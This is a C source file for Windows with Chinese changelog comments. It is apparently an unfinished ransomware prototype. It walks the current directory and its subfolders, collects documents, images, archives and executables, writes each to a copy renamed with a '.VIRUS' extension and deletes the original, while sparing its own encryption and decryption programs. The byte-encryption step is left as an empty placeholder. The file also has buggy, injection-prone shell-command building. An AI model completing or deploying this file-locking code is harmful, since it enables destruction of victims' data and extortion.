/*
  日期：2020/12/26
  作者:于京平
  內容:進度停滯不前，(重新製作)。
  
  日期：2020/12/26
  作者:于京平
  內容:主資料夾加密完成。
  
  日期：2021/1/21
  作者:于京平
  內容:主要程式已做完，善需修改和精簡程式。
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

int frequency = 0;

void file_search(char *MainPosition);
void file_read(char *MainPosition);
void folder_search(char *MainPosition);
void encryption(char *text1, char *text2);


void file_search(char *MainPosition){
  if(frequency == 0){
    system("dir /B *.exe *.txt *.docx *.jpg *.gif *.pdf *.zip *.png *.mp4 *.xls *.pptx *.mp3 *.msi *.bmp *.odg >> hack2.txt"); //需再加

    FILE *fptr1, *fptr2;
    fptr1 = fopen("hack2.txt", "r");
    fptr2 = fopen("hack.txt", "w");

    char text[10000];
    while(fgets(text, sizeof(text), fptr1) != NULL){
      if(strncmp("encryption_program.exe", text, 14) != 0 && strncmp("decryption_program.exe", text, 14) != 0 && strncmp("hack2.txt", text, 9) != 0){
	fputs(text, fptr2);
      }
    }
    fclose(fptr1);
    fclose(fptr2);
    remove("hack2.txt");
  }
  else{
    char file[100000] = "cd ";
    strcat(file, MainPosition);
    strcat(file, " && dir /B *.exe *.txt *.docx *.jpg *.gif *.pdf *.zip *.png *.mp4 *.xls *.pptx *.mp3 *.msi *.bmp *.odg >> hack2.txt");
    system(file);

    char file2[10000];
    FILE *fptr1, *fptr2;
    strcpy(file2, MainPosition);
    strcat(file2, "\\hack2.txt");
    fptr1 = fopen(file2, "r");
    strcpy(file2, MainPosition);
    strcat(file2, "\\hack.txt");
    fptr2 = fopen(file2, "w");

    char text[10000];
    while(fgets(text, sizeof(text), fptr1) != NULL){
      if(strncmp("hack2.txt", text, 9) != 0){
	fputs(text, fptr2);
      }
    }
    fclose(fptr1);
    fclose(fptr2);
    strcpy(file2, MainPosition);
    strcat(file2, "\\hack2.txt");
    remove(file2);

    file_read(MainPosition);
  }
}

void file_read(char *MainPosition){
  FILE *fptr1;
  char text1[10000];
  if(frequency == 0){
    fptr1 = fopen("hack.txt", "r");
    while(fgets(text1, sizeof(text1), fptr1) != NULL){
      char text2[10000] = "";
      strtok(text1, "\n");
      strcat(text2, text1);
      strcat(text2, ".VIRUS");
      encryption(text1, text2);
    }
    fclose(fptr1);
    frequency++;
    folder_search(MainPosition);
  }
  else{
    char file[100000];
    strcat(text1, MainPosition);
    strcat(text1, "\\");
    strcpy(file, MainPosition);
    strcat(file, "\\hack.txt");
    fptr1 = fopen(file, "r");
    char text3[100000];
    while(fgets(text3, sizeof(text3), fptr1) != NULL){
      strcpy(text1, MainPosition);
      strcat(text1, "\\");
      char text2[10000];
      strcpy(text2, MainPosition);
      strcat(text2, "\\");
      strtok(text3, "\n");
      strcat(text2, text3);
      strcat(text1, text3);
      strcat(text2, ".VIRUS");
      encryption(text1, text2);
    }
    fclose(fptr1);
    remove(file);
    folder_search(MainPosition);
  }
}

void folder_search(char *MainPosition){
  strtok(MainPosition, "\n");
  char folder[100000] = "cd ";
  strcat(folder, MainPosition);
  strcat(folder, " && dir /AD /B >> folder.txt");
  system(folder);
  char copy[100000];
  FILE *fptr;
  strcpy(folder, "");
  strcat(folder, MainPosition);
  strcat(folder, "\\folder.txt");
  fptr = fopen(folder, "r");
  char MainPosition2[100000];
  strcpy(MainPosition2, MainPosition);
  while(fgets(copy, sizeof(copy), fptr) != NULL){
    strtok(copy, "\n");
    strcat(MainPosition, "\\");
    strcat(MainPosition, copy);
    file_search(MainPosition);
    strcpy(MainPosition, MainPosition2);
  }
  fclose(fptr);
  remove(folder);
}

void encryption(char *text1, char *text2){
  FILE *fptr1, *fptr2;
  fptr1 = fopen(text1, "rb");
  fptr2 = fopen(text2, "wb");

  unsigned char ch;
  while(!feof(fptr1)){
   fread(&ch, sizeof(ch), 1, fptr1);
    if(!feof(fptr1)){
      //加密的地方
      
      fwrite(&ch, sizeof(ch), 1, fptr2);
    }
  }
  fclose(fptr1);
  fclose(fptr2);
  remove(text1);
}

int main(void){
  char MainPosition[100000];
  system("cd >> main_position.txt");
  FILE *fptr;
  fptr = fopen("main_position.txt", "r");
  fgets(MainPosition, sizeof(MainPosition), fptr);
  fclose(fptr);
  remove("main_position.txt");
  
  file_search(MainPosition);
  file_read(MainPosition);
  remove("hack.txt");

  
  system("pause");
  return 0;
}
